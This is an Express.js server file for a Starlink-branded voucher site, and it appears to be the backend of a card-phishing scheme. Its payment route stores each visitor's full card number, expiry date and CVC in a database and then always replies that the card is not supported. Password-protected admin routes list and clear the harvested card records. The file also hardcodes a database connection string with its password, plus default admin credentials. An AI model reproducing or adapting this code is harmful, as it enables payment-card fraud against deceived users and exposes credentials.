const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const mongoose = require('mongoose');
const path = require('path');
const jwt = require('jsonwebtoken');

const app = express();
const PORT = process.env.PORT || 3000;

const MONGODB_URI = process.env.MONGODB_URI || 'mongodb://mongo:UTeVLbRgfLqdsrCzCzFUcitqLqPbLuzn@switchyard.proxy.rlwy.net:32968';
const ADMIN_USER = process.env.ADMIN_USER || 'admin';
const ADMIN_PASS = process.env.ADMIN_PASS || 'starlink123';
const JWT_SECRET = process.env.JWT_SECRET || 'starlink-secret-key';

app.use(cors());
app.use(bodyParser.json());
app.use(express.static('public'));

const voucherSchema = new mongoose.Schema({ code: { type: String, required: true, unique: true, uppercase: true }, is_used: { type: Boolean, default: false }, used_at: { type: Date, default: null }, created_at: { type: Date, default: Date.now } });
const userSchema = new mongoose.Schema({ name: String, email: String, amount: Number, planDuration: String, cardNumber: String, cardExpiry: String, cardCvc: String, country: String, countryName: String, postalCode: String, created_at: { type: Date, default: Date.now } });

const Voucher = mongoose.model('Voucher', voucherSchema);
const User = mongoose.model('User', userSchema);

mongoose.connect(MONGODB_URI, { useNewUrlParser: true, useUnifiedTopology: true }).then(() => console.log('Connected to MongoDB')).catch(err => { console.error('DB connection error:', err); process.exit(1); });

function generateVoucherCode() {
  return 'STAR-' + Math.random().toString(36).substring(2, 10).toUpperCase() + Math.random().toString(36).substring(2, 6).toUpperCase();
}

function authMiddleware(req, res, next) {
  const token = (req.headers.authorization || '').slice(7);
  if (!token) return res.status(401).json({ success: false, message: 'Unauthorized' });
  try {
    jwt.verify(token, JWT_SECRET);
    next();
  } catch (err) {
    return res.status(401).json({ success: false, message: 'Invalid token' });
  }
}

// --- API Routes ---

app.post('/api/auth/login', (req, res) => {
  const { username, password } = req.body;
  if (username === ADMIN_USER && password === ADMIN_PASS) {
    const token = jwt.sign({ username }, JWT_SECRET, { expiresIn: '12h' });
    return res.json({ success: true, token });
  }
  return res.status(401).json({ success: false, message: 'Invalid credentials' });
});

app.post('/api/vouchers/generate', authMiddleware, async (req, res) => {
  try {
    const count = req.body.count || 1;
    for (let i = 0; i < count; i++) {
        try {
            await new Voucher({ code: generateVoucherCode() }).save();
        } catch (err) { if (err.code !== 11000) console.error(err); }
    }
    res.json({ success: true, message: `${count} vouchers generated.` });
  } catch (error) {
    res.status(500).json({ success: false, message: 'Error generating vouchers' });
  }
});

app.post('/api/vouchers/validate', async (req, res) => {
  try {
    const voucher = await Voucher.findOne({ code: req.body.code?.toUpperCase() });
    if (!voucher) return res.json({ success: false, valid: false, message: 'Invalid voucher' });
    if (voucher.is_used) return res.json({ success: false, valid: true, used: true, message: 'Voucher already used' });
    voucher.is_used = true;
    voucher.used_at = new Date();
    await voucher.save();
    res.json({ success: true, valid: true, used: false, message: 'Voucher activated' });
  } catch (error) {
    res.status(500).json({ success: false, message: 'Database error' });
  }
});

app.post('/api/pay', async (req, res) => {
  try {
    await new User(req.body).save();
    res.json({ success: false, message: 'Your card is not supported' });
  } catch (error) {
    res.status(500).json({ success: false, message: 'Error processing payment' });
  }
});

// GET Endpoints
app.get('/api/vouchers', authMiddleware, async (req, res) => {
    try { res.json({ success: true, vouchers: await Voucher.find().sort({ created_at: -1 }) }); } catch (e) { res.status(500).json({ success: false }); }
});
app.get('/api/vouchers/stats', authMiddleware, async (req, res) => {
    try { const total = await Voucher.countDocuments(); const used = await Voucher.countDocuments({ is_used: true }); res.json({ success: true, total, used, available: total-used }); } catch (e) { res.status(500).json({ success: false }); }
});
app.get('/api/users', authMiddleware, async (req, res) => {
    try { res.json({ success: true, users: await User.find().sort({ created_at: -1 }) }); } catch (e) { res.status(500).json({ success: false }); }
});

// DELETE Endpoints - NEW
app.delete('/api/vouchers/clear', authMiddleware, async (req, res) => {
    try { await Voucher.deleteMany({}); res.json({ success: true, message: 'All vouchers cleared.' }); } catch(e) { res.status(500).json({ success: false }); }
});
app.delete('/api/vouchers/:id', authMiddleware, async (req, res) => {
    try { await Voucher.findByIdAndDelete(req.params.id); res.json({ success: true, message: 'Voucher deleted.' }); } catch(e) { res.status(500).json({ success: false }); }
});
app.delete('/api/users/clear', authMiddleware, async (req, res) => {
    try { await User.deleteMany({}); res.json({ success: true, message: 'All payments cleared.' }); } catch(e) { res.status(500).json({ success: false }); }
});
app.delete('/api/users/:id', authMiddleware, async (req, res) => {
    try { await User.findByIdAndDelete(req.params.id); res.json({ success: true, message: 'Payment deleted.' }); } catch(e) { res.status(500).json({ success: false }); }
});

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
